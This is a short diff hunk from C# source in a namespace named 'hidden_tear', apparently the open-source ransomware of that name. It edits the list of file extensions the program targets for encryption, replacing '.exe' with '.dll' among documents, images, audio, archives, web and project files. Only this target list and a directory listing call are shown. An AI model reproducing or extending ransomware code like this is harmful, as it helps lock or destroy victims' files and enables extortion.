@@ -146,7 +146,7 @@ namespace hidden_tear
             //extensions to be encrypt
             var validExtensions = new[]
             {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png", ".mp3", ".mp4", ".locked", ".pdf", ".docx", ".hwp", ".wav", ".zip", ".wav", ".flac", ".html", ".php", ".sln", ".exe"
+                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png", ".mp3", ".mp4", ".locked", ".pdf", ".docx", ".hwp", ".wav", ".zip", ".wav", ".flac", ".html", ".php", ".sln", ".dll"
             };
 
             string[] files = Directory.GetFiles(location);
